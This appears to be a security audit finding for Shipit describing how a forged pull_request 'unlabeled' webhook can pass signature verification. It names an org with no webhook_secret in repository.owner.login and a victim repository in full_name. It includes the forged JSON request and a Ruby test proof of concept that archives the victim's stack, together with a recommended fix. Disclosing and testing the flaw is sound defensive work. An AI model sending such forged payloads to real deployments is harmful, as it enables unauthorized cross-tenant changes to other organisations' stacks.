### Title
Forged `pull_request`/`unlabeled` webhook using a no-secret org bypasses signature check and mutates an unrelated victim stack - (File: app/controllers/shipit/webhooks_controller.rb)

### Summary
`Shipit::WebhooksController#verify_signature` selects which `GitHubApp`/`webhook_secret` to validate against using only `params.dig('repository','owner','login')` [1](#0-0) [2](#0-1) , while the `UnlabeledHandler`/`LabelCapturingHandler` resolve the repository/stack to mutate using the independent field `params.repository.full_name` [3](#0-2) . Because these two fields are never required to be consistent, and `GitHubApp#verify_webhook_signature` returns `true` unconditionally when the selected org's config has no `webhook_secret` [4](#0-3) , an attacker can pick any org configured in Shipit with no `webhook_secret` for `repository.owner.login` while setting `repository.full_name` to an arbitrary victim repository, causing the request to pass signature verification and reach handlers that mutate the victim's stack.

### Finding Description
The intended (but unenforced) invariant is: `organization_whose_secret_verified_request == owner_of(repository.full_name)`. Tracing the code shows this equality is never checked:

1. `WebhooksController#verify_signature` computes `repository_owner` purely from `params.dig('repository','owner','login')` (falling back to `params.dig('organization','login')`) and calls `Shipit.github(organization: repository_owner).verify_webhook_signature(...)` [1](#0-0) [2](#0-1) .
2. `GitHubApp#verify_webhook_signature` short-circuits with `return true unless webhook_secret` when the resolved org's config has a blank `webhook_secret` [4](#0-3) .
3. On success, `#create` dispatches the raw parsed `params` (the entire JSON body, unfiltered) to every registered `pull_request` handler via `Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }` [5](#0-4) , including `UnlabeledHandler` and `LabelCapturingHandler` [6](#0-5) .
4. `UnlabeledHandler#repository` resolves the repository strictly from `params.repository.full_name`, via `Shipit::Repository.from_github_repo_name(params.repository.full_name)` [3](#0-2)  — a field completely independent of `repository.owner.login` used in step 1. `LabelCapturingHandler` does the same [7](#0-6) .
5. `UnlabeledHandler#handle` then calls `stack.archive!` / `stack.unarchive!` on the `ReviewStackAdapter`-resolved stack for that victim repository [8](#0-7) , and `LabelCapturingHandler#capture_labels` overwrites `PullRequest#labels` on the victim's pull request record [9](#0-8) .

**Attacker request:** POST `/webhooks` with header `X-Github-Event: pull_request`, body:
```json
{
  "action": "unlabeled",
  "number": 1,
  "pull_request": { ... "state": "open", "head": {...}, "user": {"login": "attacker"}, "assignees": [], "labels": [] },
  "repository": { "full_name": "victim-org/victim-repo", "owner": {"login": "attacker-no-secret-org"} },
  "sender": { "login": "attacker" }
}
```
with `X-Hub-Signature: sha1=deadbeef` (any value; irrelevant since `attacker-no-secret-org` has no `webhook_secret` configured in Shipit, e.g. a minimally-configured GitHub App entry with only `app_id`/`installation_id` and no `webhook_secret`). `verify_signature` resolves `Shipit.github(organization: "attacker-no-secret-org")`, hits the blank-secret short-circuit, and returns `true`, so `head(422)` is never called. The handler then archives/unarchives (or rewrites labels on) `victim-org/victim-repo`'s stack — a repository the attacker never controls and whose own org may have a properly configured `webhook_secret` that was never checked.

Existing guards do not catch this: `drop_unhandled_event` only checks the event name is registered, not payload content [10](#0-9) ; the `ExplicitParameters` schema on the handlers requires `repository.full_name` to be a `String` but places no constraint that it match the org whose secret was verified [11](#0-10) ; and `Repository.from_github_repo_name` has no cross-check against `repository_owner`.

### Impact Explanation
A request authenticated only by an attacker-controlled/no-secret org's (absent) HMAC secret is able to archive or unarchive a review stack, or overwrite pull-request label state, belonging to an entirely different, victim-owned repository/organization. This is cross-tenant state manipulation: one repository's (attacker's) forged payload writes another repository's (victim's) `Stack`/`PullRequest` records, matching the Critical category "a payload for one repository mutating another's stack." The attack is fully repeatable against any repository configured with `review_stacks_enabled`, requiring only knowledge of the victim's `full_name` (public information) and the existence of at least one Shipit-configured org lacking a `webhook_secret`.

### Likelihood Explanation
Preconditions: Shipit must be configured in the multi-org GitHub App mode (`github_default_organization` non-nil) with at least one org entry lacking `webhook_secret`, and the victim repository must have `review_stacks_enabled`. Given these fairly common misconfigurations/multi-tenant setups, exploitation cost is a single unauthenticated HTTP POST with a JSON body the attacker fully controls — no valid signature, session, or credential is needed. This is trivially repeatable at will.

### Recommendation
Bind the signature-verifying organization to the same identity used for the mutation: require `repository.owner.login` to match the owner segment of `repository.full_name` before dispatching to handlers, or resolve the target repository/stack using the verified `repository_owner`/`GitHubApp` context rather than the untrusted `repository.full_name` field. Additionally, do not treat a blank `webhook_secret` as automatically valid — either mandate `webhook_secret` for all configured orgs or explicitly document/enforce that orgs without one cannot mutate cross-org resources.

### Proof of Concept
```ruby
test "unlabeled webhook from a no-secret org can archive a stack belonging to another org's repository" do
  # Named-value equality under test:
  # verifying_org  = params.dig('repository','owner','login')      => "attacker-org" (no webhook_secret)
  # mutated_repo_owner = params.dig('repository','full_name').split('/').first => "victim-org"
  # BEFORE: verifying_org != mutated_repo_owner, yet request is accepted (422 not raised)

  victim_repo = shipit_repositories(:shipit) # e.g. "victim-org/victim-repo", review_stacks_enabled: true
  victim_stack = shipit_stacks(:shipit_review_stack) # belongs to victim_repo, not archived

  Shipit.stubs(:github_app_config).with('attacker-org').returns({}) # no webhook_secret configured

  payload = {
    action: 'unlabeled',
    number: victim_stack.pull_request.number,
    pull_request: {
      id: 1, number: victim_stack.pull_request.number, url: 'https://api.github.com/x',
      title: 't', state: 'open', additions: 1, deletions: 1,
      head: { sha: 'a' * 40, ref: 'feature' },
      user: { login: 'attacker' },
      assignees: [],
      labels: []
    },
    repository: { full_name: victim_repo.full_name, owner: { login: 'attacker-org' } },
    sender: { login: 'attacker' }
  }.to_json

  post '/webhooks', params: payload,
       headers: { 'X-Github-Event' => 'pull_request', 'X-Hub-Signature' => 'sha1=bogus', 'Content-Type' => 'application/json' }

  assert_response :ok # not 422 — signature "verified" despite no valid HMAC
  assert victim_stack.reload.archived?, "victim stack was archived by a forged payload verified under an unrelated org"
end
```
This demonstrates the divergence: the org whose (absent) secret "verified" the request (`attacker-org`) differs from the org owning the mutated stack (`victim-org`), and no code path in `WebhooksController` or the PR handlers rejects the mismatch.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L10-15)
```ruby
    def create
      params = JSON.parse(request.raw_post)
      Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }

      head(:ok)
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L19-22)
```ruby
    def drop_unhandled_event
      # Acknowledge, but do nothing
      head(204) unless Shipit::Webhooks.for_event(event).present?
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L33-35)
```ruby
            requires :repository do
              requires :full_name, String
            end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L49-57)
```ruby
          def handle
            if archive?
              stack.archive!
            elsif unarchive?
              stack.unarchive!
            end

            stack
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L59-63)
```ruby
          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks.rb (L9-18)
```ruby
          'pull_request' => [
            Handlers::PullRequest::OpenedHandler,
            Handlers::PullRequest::ClosedHandler,
            Handlers::PullRequest::ReopenedHandler,
            Handlers::PullRequest::EditedHandler,
            Handlers::PullRequest::AssignedHandler,
            Handlers::PullRequest::LabeledHandler,
            Handlers::PullRequest::UnlabeledHandler,
            Handlers::PullRequest::LabelCapturingHandler
          ],
```

**File:** app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb (L98-102)
```ruby
          def capture_labels
            return unless pull_request = stack.pull_request

            pull_request.update!(labels: params.pull_request.labels.map(&:name))
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb (L110-114)
```ruby
          def repository
            @repository ||=
              Shipit::Repository
              .from_github_repo_name(params.repository.full_name) || NullRepository.new
          end
```
